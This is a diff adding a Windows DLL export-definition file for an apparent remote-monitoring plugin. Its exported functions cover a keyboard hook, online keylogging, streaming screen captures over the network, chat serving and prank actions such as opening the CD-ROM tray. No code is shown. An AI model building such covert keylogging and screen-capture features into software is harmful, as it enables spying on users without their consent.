@@ -1,0 +1,35 @@
+
+
+;LIBRARY	WinMonitorServerPlugin.1.0.dll
+
+EXPORTS
+	
+		SetCmdShowType @1
+		SetPrivateHeap @19
+		InstallKeyBoardHook @16
+		UnInstallKeyBoardHook @17
+
+	;Fun Plugins
+		RegisterAsFunPluginClient    @2
+		StartOrStopKeyBoardFunPlugin @3 
+		UnRegisterAsFunPluginClient  @4
+		OpenOrCloseCDRom @18
+		
+	;ScreenMonitor Functions
+		RegisterAsScreenMonitorUser             @5
+		RemoveScreenMonitorUser                 @6
+		SetCompressionOrType                    @7
+		ScreenMonitorWriteToNetworkByteStream   @8
+		ScreenMonitorReadFromNetworkByteStream  @9
+		CaptureOrReplaceDesktopOrWindowImage    @10
+		LoadOrSaveImage                         @11
+		
+	;Chat Server Functions
+		RegisterAsChatServer @12
+		RemoveChatServer     @13
+		ServiceChatClient    @14
+	
+	;OnLine KeyLogging Functions
+		AddOnLineKeyLoggerClient @15
+
+;19 ordinals
